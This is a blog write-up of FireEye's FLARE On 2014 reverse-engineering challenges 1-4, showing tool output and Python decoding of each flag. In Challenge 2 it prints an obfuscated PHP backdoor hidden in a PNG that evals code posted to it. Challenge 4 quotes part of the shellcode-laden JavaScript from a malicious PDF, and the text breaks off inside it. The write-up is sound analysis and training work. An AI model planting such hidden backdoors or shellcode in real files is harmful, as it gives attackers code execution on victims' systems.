FireEye FLARE On 2014 Challenges (1-5)
======================================
date: 18/Feb/2016
summary: This is a writeup for FireEye's FLARE On 2014 challenges that I recently attempted.
tags: ctf

## Introduction

FireEye has been putting up CTF styled malware and forensics challenges for last two years, named [FLARE On](http://www.flare-on.com/). I recently attempted few of those challenges from the 2014 set and will document steps to complete them.

The challenge files are available under the [PastResults/2014/Downloads](http://www.flare-on.com/PastResults/2014/Downloads) directory on the site. If you are into malware analysis and have worked with publicly available samples earlier, you can easily guess the password. If not consider this archive to be a challenge and try breaking the password scheme for it :)

Once you get hold of the challenge files, you will find that there are total seven of them. This writeup documents the steps involved in solving challenges 1-5 and 6-7 have been left out for another post. Let's get started with the writeup now.

## Challenges
### Challenge #1
The first challenge seems to be a PE file but let's do the initial reconnaissance to gather more details:

```
$ file C1.exe
C1.exe: PE32+ executable (GUI) x86-64, for MS Windows
$
$ file -i C1.exe
C1.exe: application/x-dosexec; charset=binary
$
$ strings C1.exe
!This program cannot be run in DOS mode.
{K5Rich
.text
`.data
.pdata
@.idata
@.rsrc
@.reloc
Invalid parameter passed to C runtime function.
advapi32.dll
CheckTokenMembership
.INF
Reboot
AdvancedINF
Version
setupx.dll
setupapi.dll
.BAT
SeShutdownPrivilege
advpack.dll
DelNodeRunDLL32
wininit.ini
Software\Microsoft\Windows\CurrentVersion\App Paths
HeapSetInformation
...<snip>...
GetSystemMetrics
RIFF
AVI LIST
hdrlavih8
G\AN
LIST
strlstrh8
vidsRLE
strfh
vedt
JUNK
LISTv$
movi00dc(
00dc
...<snip>...
Thank you for taking the FLARE On challenge and good luck!
PBY CLICKING ON THE "ACCEPT" BUTTON, YOU OR THE ENTITY THAT YOU REPRESENT ("LICENSEE", "YOU" OR END-USER") ARE UNCONDITIONALLY CONSENTING TO BE BOUND BY AND ARE BECOMING A PARTY TO THIS END USER LICENSE AGREEMENT ("AGREEMENT") WITH FIREEYE, INC. AND ITS AFFILIATES ("FIREEYE" OR "LICENSOR"). IF THESE TERMS ARE
...<snip>...
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!-- Copyright (c) Microsoft Corporation -->
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity version="5.1.0.0"
     processorArchitecture="amd64"
     name="wextract"
     type="win32"/>
...<snip>...
</assembly>
PPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPAD
$
```

So, the usual stuff. It is a PE file for x64 architecture. Nothing out of the ordinary here. However, upon executing this file inside a VM I found that it shows an EULA from FireEye and once you agree with terms of the license it drops a file named `Challenge1.exe`:

```
$ file Challenge1.exe
Challenge1.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
$
```

So the first challenge is a `.Net` file. Let's try executing it:

![image](/static/files/posts_flareon2014_15/flareon2014-c1-1.png.webp)

The file shows a window with `Form1` as its title, a funny image with a message `Let's start with something easy!` and a huge `DECODE!` button. Upon clicking the button, image turns awkward and message changes to some cryptic text:

![image](/static/files/posts_flareon2014_15/flareon2014-c1-2.png.webp)

I opened this file with [ILSpy](http://ilspy.net/) and found the `Form1` object with an interesting method called `btnDecode_Click`:

![image](/static/files/posts_flareon2014_15/flareon2014-c1-ilspy-btndecode.png.webp)

This method is the callback for the `OnClick` eventhandler of the `DECODE!` button we saw on the UI. Interestingly it has some loops that mangle bits and update the message with the resulting encoded text. The source message is loaded from a resource object called `dat_secret`. You can save this object as a binary blob to a local file for further analysis:

![image](/static/files/posts_flareon2014_15/flareon2014-c1-ilspy-datsecret-save.png.webp)

Upon loading this binary blob, the first loop in the file performs some byte shifting and xor operations on it:

![image](/static/files/posts_flareon2014_15/flareon2014-c1-ilspy-deobfuscate.png.webp)

Let's quickly reverse these operations before proceeding further:

```python
$ file rev_challenge_1.dat_secret.encode
rev_challenge_1.dat_secret.encode: data
$
$ wc -c rev_challenge_1.dat_secret.encode
31 rev_challenge_1.dat_secret.encode
$
$ hd rev_challenge_1.dat_secret.encode
00000000  a1 b5 44 84 14 e4 a1 b5  d4 70 b4 91 b4 70 d4 91  |..D......p...p..|
00000010  e4 c4 96 f4 54 84 b5 c4  40 64 74 70 a4 64 44     |....T...@dtp.dD|
0000001f
$
$ ipython
>>> with open("rev_challenge_1.dat_secret.encode", "rb") as fo:
...   c = fo.read()
...
>>> "".join([chr((ord(b) >> 4 | (ord(b) << 4 & 240)) ^ 41) for b in c])
'3rmahg3rd.b0b.d0ge@flare-on.com'
>>>
```

Alright, so the binary blob is of size 31B and has seemingly uninteresting data. On repeating the bit operations we get an email and this completes the challenge for us.

### Challenge #2
This challenge has two files: a HTML and PNG respectively. From the very start of this challenge I was keen on analyzing the PNG as somewhere in the back of my mind I had this intuition that it could be a stegano challenge. As such I tried gathering more information about the PNG file:

```
$ file home.html
home.html: HTML document, UTF-8 Unicode text, with very long lines, with CRLF line terminators
$
$ file img/flare-on.png
img/flare-on.png: PNG image data, 400 x 79, 8-bit/color RGBA, non-interlaced
$
$ exiftool img/flare-on.png
ExifTool Version Number         : 9.46
File Name                       : flare-on.png
Directory                       : img
File Size                       : 9.3 kB
File Modification Date/Time     : 2014:07:08 07:00:47+05:30
File Access Date/Time           : 2016:02:17 14:43:58+05:30
File Inode Change Date/Time     : 2016:02:15 17:49:38+05:30
File Permissions                : rw-rw-r--
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 400
Image Height                    : 79
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 4724
Pixels Per Unit Y               : 4724
Pixel Units                     : Meters
Software                        : Adobe ImageReady
Image Size                      : 400x79
$
```

Honestly, this output depressed me a bit as there was nothing particularly interesting here. But before delving into analyzing the HTML, I decided to view the image once:

![image](/static/files/posts_flareon2014_15/flareon2014-c2-1.png.webp)

Ah! This left me no choice but to open the HTML and analyze the source, something I was reluctant to do. Anyways, I viewed the source and here's a snippet of interesting stuff:

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>The FLARE On Challenge</title>
    <link rel="stylesheet" type="text/css" href="http://bootswatch.com/lumen/bootstrap.min.css">
    ...<snip>...
                  <p>The FireEye Labs Advanced Reverse Engineering (FLARE) team is an elite technical
                     group of malware analysts, researchers, and hackers. We are looking to hire smart
                     individuals interested in reverse engineering. We have created this series of binary
                     challenges to test your skills. We encourage anyone to participate and practice their
                     skills while having fun!</p>
    ...<snip>...
    <?php include "img/flare-on.png" ?>
    <script type="text/javascript">
        $(document).ready(function(){
            $('#counter').countdown({
                timestamp : new Date(2014,6,7,4,0,0,0)
            });
        });
    </script>
</body>
</html>
```

Take note of the `php include` near bottom of the page. The PNG image is being loaded as a PHP script. This is highly deceptive and immediately reassures my initial belief that the PNG indeed has something interesting in it. I decided to open the PNG in a text editor:

![image](/static/files/posts_flareon2014_15/flareon2014-c2-2.png.webp)

Alright, so the PNG file has a PHP script appended to it. Let's extract and analyze this script separately:

```php
<?php $terms=array("M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|");
$order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);
$do_me="";
for($i=0;$i<count($order);$i++){
    $do_me=$do_me.$terms[$order[$i]];
}
eval($do_me); ?>
```

The first thing I did was to port the PHP code to Python and here's the result:

```python
$ ipython
>>> terms = ["M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|"]
>>>
>>> order = [59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47]
>>>
>>> data = ""
>>> for i in order:
...   data += terms[i]
...
>>> print data
$_= 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9';$__='JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';$___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";eval($___($__));
>>>
```

Let's do the `eval` manually. The `$__` variable is referenced first and it looks like to be base64 encoded. Let's decode it:

```
$ echo -en "JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7" | base64 -d -
$code=base64_decode($_);eval($code);
$
```

So, this code will base64 decode the `$_` variable and that's what we need to do next:

```
$ echo -en "aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9" | base64 -d -
if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"])) {
 eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"]));
}
$
```

So the decoding results in more PHP code that will `eval` the base64 decoded version of string: `\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D`. This string is weird as it contains hex, octal and seemingly octal bytes. Look carefully at the bytes: `\97\49\x31\68`. Although preceded by a backslash `97`, `49` and `68` are not octal bytes. It seems like another layer of obfuscation where decimal bytes are preceded with slashes to confuse the parser. Thanks to [this](http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html) writeup from [@bbaskin](https://twitter.com/bbaskin) we can easily decode this encoded blob and get the flag:

```python
$ ipython
>>>
>>> c = r"\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"
>>> result = ""
>>> for item in c.split("\\"):
...   if item and item != "":
...     if item[0] == "x":
...       result += chr(int(item[1:3], 16))
...     else:
...       result += chr(int(item))
...
>>> print result
a11DOTthatDOTjava5crapATflareDASHonDOTcom
>>>
>>> print result.replace("DOT", ".").replace("DASH", "-").replace("AT", "@")
a11.that.java5crap@flare-on.com
>>>
```

### Challenge #3
This challenge comprised of a binary file aptly named `such_evil.exe`. Let's do the initial information gathering on this file:

```
$ file such_evil
such_evil: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
$
$ strings such_evil
!This program cannot be run in DOS mode.
.text
`.data
%(0@
%,0@
%00@
%40@
%80@
%<0@
%@0@
msvcrt.dll
_controlfp
__set_app_type
__getmainargs
exit
_XcptFilter
_exit
_except_handler3
$
```

That's an extremely small number of strings but nothing out of the ordinary. I used [pestudio](https://www.winitor.com/) at this point but there wasn't much to infer. Eventually I decided to debug the file with [Ollydbg](http://www.ollydbg.de/):

![image](/static/files/posts_flareon2014_15/flareon2014-c3-1.png.webp)

I stepped through the code, carefully avoiding the `msvcrt` code and placing breakpoints at `CALL` instructions. That is when I stumbled across one such instruction: `CALL 00401000`. When I stepped over this call, the program terminated with a popup showing `BrokenByte` message:

![image](/static/files/posts_flareon2014_15/flareon2014-c3-2.png.webp)

I decided to enter this code and restarted the process. Upon entering it I found a lot of code performing stack operations. I skipped through these instructions till the point where a `CALL EAX` instruction was placed immediately after the stack operations. Upon entering this call, I found instructions that seemed like part of a decoding routine:

![image](/static/files/posts_flareon2014_15/flareon2014-c3-3.png.webp)

However, it turned out to be just another excessively long routine doing useless stuff, decoding strings like `nopasaurus`, `and i'm spent`, etc. I decided to keep a tab on these string locations. A few instructions later the `BrokenByte` string was pushed to stack hence indicating termination of program. At this point it was evident that the program won't display flag as a popup message but instead decode and keep it in memory. Looking around the memory locations where strings were being decoded, I found an email like string:

![image](/static/files/posts_flareon2014_15/flareon2014-c3-3.png.webp)

So the flag for this challenge turned out to be: `such.5h311010101.flare-on.com`

### Challenge #4
This is a PDF challenge and I started with my usual information gathering steps:

```
$ file APT9001.pdf
APT9001.pdf: PDF document, version 1.5
$
$ pdfinfo APT9001.pdf
Tagged:         no
Form:           none
Pages:          2
Encrypted:      no
Page size:      612 x 792 pts (letter)
Page rot:       0
File size:      21284 bytes
Optimized:      no
PDF version:    1.5
$
$ pdfid.py APT9001.pdf
PDFiD 0.2.1 APT9001.pdf
 PDF Header: %PDF-1.5
 obj                   10
 endobj                 9
 stream                 3
 endstream              3
 xref                   2
 trailer                2
 startxref              2
 /Page                  3(2)
 /Encrypt               0
 /ObjStm                0
 /JS                    1(1)
 /JavaScript            1(1)
 /AA                    0
 /OpenAction            1(1)
 /AcroForm              0
 /JBIG2Decode           1(1)
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /Colors > 2^24         0
$
```

So we have a PDF file of 21KB with two pages and no optimizations. It has an object with `Javascript`, `OpenAction` and `JBIB2DECODE` filters. I decided to open this file and look at its pages. The first page shows title from the [Mandiant APT1](http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf) report and the other page is left blank. I tried analyzing its objects and streams using [peepdf](http://eternal-todo.com/tools/peepdf-pdf-analysis-tool) but it crashed. However Didier Stevens [pdf-parser.py](http://blog.didierstevens.com/programs/pdf-tools/) script was able to decode it correctly:

```
$ pdf-parser.py APT9001.pdf
PDF Comment '%PDF-1.5\r\n'
PDF Comment '%\xea\xbb\xc1\x9c\r\n'
obj 1 0
 Type: /Catalog
 Referencing: 2 0 R, 3 0 R, 5 0 R
  <<
    /Type /Catalog
    /Outlines 2 0 R
    /Pages 3 0 R
    /OpenAction 5 0 R
  >>
obj 2 0
 Type: /Outlines
 Referencing:
  <<
    /Type /Outlines
    /Count 0
  >>
obj 3 0
 Type: /Pages
 Referencing: 4 0 R, 7 0 R
  <<
    /Type /Pages
    /Kids '[  4 0 R \r\n7 0 R   \r\n]'
    /Count 2
  >>
obj 4 0
 Type: /Page
 Referencing: 3 0 R
  <<
    /Type /Page
    /Parent 3 0 R
    /MediaBox '[0  0 \r\n 612   \r\n 792   \r\n ]'
  >>
obj 5 0
 Type: /Action
 Referencing: 6 0 R
  <<
    /Type /Action
    /S /JavaScript
    /JS 6 0 R
  >>
obj 6 0
 Type:
 Referencing:
 Contains stream
  <<
    /Length 6170
    /Filter '[  \r\n /Fla#74eDe#63o#64#65  /AS#43IIHexD#65cod#65 ]'
  >>
obj 7 0
 Type: /Page
 Referencing: 3 0 R, 8 0 R
 Contains stream
  <<
    /Type /Page
    /Parent 3 0 R
    /Contents [ 8 0 R ]
  >>
xref
trailer
  <<
    /Size 9
    /Root 10R
  >>
startxref 7169
obj 4 0
 Type: /Page
 Referencing: 3 0 R, 9 0 R
  <<
    /Type /Page
    /Parent 3 0 R
    /MediaBox [ 0 0 612 792 ]
    /Resources
    /CropBox [ 0 0 612 792 ]
    /Rotate 0
    /Contents [ 9 0 R ]
  >>
obj 9 0
 Type:
 Referencing:
 Contains stream
  <<
    /Length 13514
    /Filter [ /FlateDecode ]
  >>
xref
trailer
  <<
    /Size 10
    /Root 10R
    /Prev 7169
  >>
startxref 21163
PDF Comment '%%EOF\n'
$
```

Of all objects, #6 seemed interesting as the `FlateDecode` and `ASCIIHexDecode` encoded javascript inside it was referenced by #5. Let's extract and analyze this javascript code:

```
$ pdf-parser.py APT9001.pdf -f -o6
obj 6 0
 Type:
 Referencing:
 Contains stream
  <<
    /Length 6170
    /Filter '[  \r\n /Fla#74eDe#63o#64#65  /AS#43IIHexD#65cod#65 ]'
  >>
 '\n    var HdPN = "";\n    var zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf = "";
 \n    var IxTUQnOvHg = unescape("%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b